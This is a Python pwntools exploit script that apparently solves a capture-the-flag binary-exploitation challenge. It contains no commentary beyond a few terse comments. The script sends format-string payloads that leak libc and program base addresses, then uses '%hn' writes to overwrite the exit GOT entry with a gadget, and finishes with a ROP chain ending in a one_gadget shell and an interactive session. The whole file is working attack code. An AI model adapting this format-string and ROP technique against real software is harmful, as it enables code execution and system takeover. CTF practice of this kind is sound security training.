from pwn import *

p = process("./challenge")

p.sendline(str(0xfff0))

pop = 0x013cc0e # pop rdx ; pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
prs = 0x0202e8 # pop rsi ; ret
prd = 0x021102 # pop rdi ; ret
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
exit_got = 0x201018

libcoffset = 0x20829
codeoffset = 0x880



# leak ------------

payload = "%21$lx  " #libcbase offset 0x20830
payload += "%25$lx  " #codebase offset 0x880
payload += "a"*0x68
payload += "\x29"

p.send(payload)

leak = int(p.recv(12),16)
libc = leak-libcoffset
p_rs = libc+prs
oneshot = libc+one_gadget[1]
log.info("libc "+hex(libc))

p.recv(2)
leak = int(p.recv(12),16)
code = leak-codeoffset 

one = ["",0,0,0]

one[0] = hex(libc+pop)
one[1] = int(one[0][2:6],16)
one[2] = int(one[0][6:10],16)
one[3] = int(one[0][10:14],16)
one[0] = int(one[0],16)

log.info("code "+hex(code))
log.info("got : "+hex(code+exit_got))
log.info(hex(one[0]))
log.info(hex(one[1]))
log.info(hex(one[2]))
log.info(hex(one[3]))

# overwrite ------------

w1 = "%"+str(one[3]-1)+"c"
w2 = "%"+str(one[2]-one[3]-3+0x10000)+"c"
w3 = "%"+str(one[1]-one[2]-3+0x10000)+"c"


payload2 = w1+" "*(8-len(w1))
payload2 += "%15$hn  "
payload2 += w2+" "*(8-len(w2))
payload2 += "%16$hn  "
payload2 += w3+" "*(8-len(w3))
payload2 += "%17$hn  "
# pop rsi -> 0 -> oneshot gdaget
payload2 += p64(p_rs)
payload2 += p64(0)
payload2 += p64(oneshot)
# overwrite exit_got to pop*7 ret gadget  
payload2 += p64(code+exit_got)  #one[3] - 15
payload2 += p64(code+exit_got+2)#one[2] - 16
payload2 += p64(code+exit_got+4)#one[1] - 17

pause()
p.sendline(payload2)

l = (one[1]+0x20000)/1024

for i in range(0,l):
     p.recv(1024)

log.info(hex(one[0]))

p.interactive()
